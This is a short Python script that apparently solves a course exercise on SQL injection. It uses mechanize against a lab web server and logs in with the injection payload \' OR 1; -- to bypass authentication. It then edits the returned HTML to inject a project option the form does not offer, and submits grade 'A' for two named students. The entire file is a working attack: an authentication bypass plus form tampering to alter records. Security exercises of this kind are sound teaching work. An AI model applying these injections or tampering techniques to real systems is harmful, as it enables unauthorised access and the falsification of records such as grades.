#mibailey
#\' OR 1; --
#solution for part1::part2
import mechanize

br = mechanize.Browser()
br.open("http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject2/")
assert br.viewing_html()

br.select_form(nr=0)
br["login"] = "mibailey"
br["password"] = "\\\' OR 1; --"
response2 = br.submit()

br.select_form(nr=0)
print br.form

html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project3\"> project3 </option> </select>")
response = mechanize.make_response(
		html, [("Content-Type", "text/html")],
		"http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject2/", 200, "OK")

br.set_response(response)

br.select_form(nr=0)

br["uniqname"] = "sklarj"
br["project"] = ["project3"]
br["grade"] = "A"
response2 = br.submit()


html = br.response().get_data().replace("<select name=\"project\"></select>", "<select name=\"project\"> <option name=\"project3\"> project3 </option> </select>")
response = mechanize.make_response(
		html, [("Content-Type", "text/html")],
		"http://ec2-54-245-12-74.us-west-2.compute.amazonaws.com/sqlinject2/", 200, "OK")

br.set_response(response)

br.select_form(nr=0)

br["uniqname"] = "lhejazi"
br["project"] = ["project3"]
br["grade"] = "A"
response2 = br.submit()
